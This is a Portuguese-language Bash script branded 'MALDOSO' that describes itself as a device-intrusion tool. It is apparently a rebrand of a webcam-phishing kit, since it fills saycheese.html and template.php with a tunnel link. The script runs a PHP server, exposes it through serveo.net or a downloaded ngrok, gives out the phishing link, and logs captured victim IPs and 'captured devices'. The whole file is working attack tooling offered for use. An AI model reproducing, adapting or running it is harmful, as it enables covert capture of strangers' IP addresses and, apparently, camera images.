#!/bin/bash

# ===== CORES (ANSI) =====
GREEN="\e[1;92m"
GRAY="\e[1;90m"
RESET="\e[0m"

trap 'printf "\n";stop' 2

banner() {

printf "${GREEN}  __  __    _    _      ____   ___  ____   ___  ${RESET}\n"
printf "${GREEN} |  \/  |  / \  | |    |  _ \ / _ \/ ___| / _ \ ${RESET}\n"
printf "${GREEN} | |\/| | / _ \ | |    | | | | | | \___ \| | | |${RESET}\n"
printf "${GREEN} | |  | |/ ___ \| |___ | |_| | |_| |___) | |_| |${RESET}\n"
printf "${GREEN} |_|  |_/_/   \_\_____|____/ \___/|____/ \___/ ${RESET}\n"


printf "${GRAY}        [ MALDOSO • Invasão De Dispositivo ]${RESET}\n"

printf "${GRAY}              v1.0 codado por Duzinn${RESET}\n"
}

stop() {
pkill -f ngrok > /dev/null 2>&1
pkill -f php > /dev/null 2>&1
pkill -f ssh > /dev/null 2>&1
exit 1
}

dependencies() {
command -v php > /dev/null 2>&1 || {
echo -e "${GREEN}[!]${GRAY} PHP não está instalado. Abortando.${RESET}"
exit 1
}
}

catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
printf "${GREEN}[+]${GRAY} IP capturado:${GREEN} %s${RESET}\n" "$ip"
cat ip.txt >> saved.ip.txt
}

checkfound() {

printf "\n${GRAY}[*] Aguardando alvos... Ctrl + C para sair${RESET}\n"

while true; do

if [[ -e "ip.txt" ]]; then
printf "\n${GREEN}[+]${GRAY} IP resgatado${RESET}\n"
catch_ip
rm -rf ip.txt
fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n${GREEN}[+]${GRAY} Dispositivo capturado com sucesso${RESET}\n"
rm -rf Log.log
fi

sleep 0.5
done
}

server() {

command -v ssh > /dev/null 2>&1 || {
echo -e "${GREEN}[!]${GRAY} SSH não está instalado. Abortando.${RESET}"
exit 1
}

printf "${GRAY}[+] Iniciando Serveo...${RESET}\n"

pkill -f php > /dev/null 2>&1

if [[ $subdomain_resp == true ]]; then
ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 \
-R $subdomain:80:localhost:3333 serveo.net \
2> /dev/null > sendlink &
else
ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 \
-R 80:localhost:3333 serveo.net \
2> /dev/null > sendlink &
fi

sleep 8

printf "${GRAY}[+] Iniciando servidor PHP (localhost:3333)...${RESET}\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &

sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf "${GREEN}[+]${GRAY} Link direto:${GREEN} %s${RESET}\n" "$send_link"
}

payload() {
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
sed 's+forwarding_link+'$send_link'+g' saycheese.html > index2.html
sed 's+forwarding_link+'$send_link'+g' template.php > index.php
}

payload_ngrok() {
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' saycheese.html > index2.html
sed 's+forwarding_link+'$link'+g' template.php > index.php
}

ngrok_server() {

command -v unzip > /dev/null 2>&1 || exit 1
command -v wget > /dev/null 2>&1 || exit 1

if [[ ! -e ngrok ]]; then
printf "${GRAY}[+] Baixando ngrok...${RESET}\n"
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
fi

printf "${GRAY}[+] Iniciando servidor PHP...${RESET}\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2

printf "${GRAY}[+] Iniciando ngrok...${RESET}\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "${GREEN}[+]${GRAY} Link direto:${GREEN} %s${RESET}\n" "$link"

payload_ngrok
checkfound
}

start1() {

rm -f sendlink

printf "\n"
printf "${GRAY}[01] Servidor Local${RESET}\n"
printf "${GRAY}[02] Servidor Online${RESET}\n"

read -p "$(echo -e ${GRAY}'[+] Escolha uma opção: '${RESET})" option_server
option_server="${option_server:-1}"

if [[ $option_server -eq 1 ]]; then
start
elif [[ $option_server -eq 2 ]]; then
ngrok_server
else
printf "${GREEN}[!]${GRAY} Opção inválida${RESET}\n"
sleep 1
clear
start1
fi
}

start() {

default_subdomain="maldoso$RANDOM"

read -p "$(echo -e ${GRAY}'[+] Escolher subdomínio? [Y/n]: '${RESET})" choose_sub
choose_sub="${choose_sub:-Y}"

if [[ $choose_sub =~ ^[Yy]$ ]]; then
subdomain_resp=true
read -p "$(echo -e ${GRAY}'[+] Subdomínio (default: '${default_subdomain}'):'${RESET})" subdomain
subdomain="${subdomain:-$default_subdomain}"
fi

server
payload
checkfound
}

banner
dependencies
start1